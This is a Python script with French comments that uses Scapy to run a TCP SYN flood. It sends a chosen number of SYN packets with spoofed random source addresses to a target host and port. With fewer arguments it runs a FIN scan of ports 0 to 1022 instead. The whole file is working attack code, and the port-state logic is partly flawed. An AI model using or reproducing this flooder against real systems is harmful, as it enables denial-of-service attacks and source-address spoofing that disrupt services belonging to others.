#!usr/bin/python3
#-----------------------------------------
#	Auteur:Rose
#	Titre: Script  Flooder tcp
#	Date:21/05/2021
#-----------------------------------------
"""On importe les librairies"""
import sys
from scapy.all import *
from scapy.layers.inet import IP, TCP
from socket import *
import time
import random
import os

startTime = time.time()
"""On définie la timeur qui sera affiché à la fin du Script"""
def randInt():
	"""Fonction permettant de générer des chiffres aléatoirement"""
	x = random.randint(1000,9000)
	return x
def randomIP():
	"""Fonction permettant de générer une IP aléatoire lors du Flooding"""
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip
def SYN_Flood(dstIP,dstPort,counter, total: int=0):
	"""Fonction permettant de générer les différents packets pour Flooder

		Lors de la création du packets l'on prend l'entrer counter permettant
		 de compter le nombre de packets que vous souhaitez envoyer.

	"""

	print ("Envois de packets en cours ...")
	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()
		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP
		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow
		send(IP_Packet/TCP_Packet, verbose=0)
		total += 1
	sys.stdout.write("\nTotal de packets envoyer: %i\n" % total)

if __name__ == '__main__':

	if len( sys.argv ) == 3:
		""" S'il y a 3 arguments dans votre entrer alors...

		t_IP= addresse ip de destination
		t_PORT = port de destination
		counter= le nombre de packets que vous souhaitez envoyer.

		"""
		entre = sys.argv[1]
		t_IP = gethostbyname(entre)
		t_P = sys.argv[2]
		t_PORT = int(t_P)
		counter = input ("Combien de packet voulez-vous envoyer: ")
		SYN_Flood(t_IP,t_PORT,int(counter))
	else :
		""" S'il y a 2 arguments dans votre entrer alors...

		t_IP= addresse ip de destination
		t_PORT = port de destination

		Boucle qui affiche l'état des ports de 0 à 1023 port: OUVERT,FERME ou FILTRE.
		Et affiche le temps de l'opération à la fin.
		"""
		entre = sys.argv[1]
		t_IP = gethostbyname(entre)
		print ('Scan de l\'adresse: ', t_IP)
		for i in range(0, 1023) :
			conn = sr1(IP(dst=t_IP) / TCP(sport=RandShort(), dport=i, flags='F'), timeout=0.1, verbose=False)
			if conn is None :
				print ('Port %d: OPEN' % (i,))

			elif TCP in conn:
				if conn["TCP"].flags =="RA" :
					print ('Port %d: FERME' % (i,))
				elif int(conn["ICMP"].type) == 3 and int(conn["ICMP"].code) in [1, 2, 3, 9, 10, 13]:
					print ('Port %d: FILTRE' % (i,))

		print('Temps total de l oppération:', time.time() - startTime)
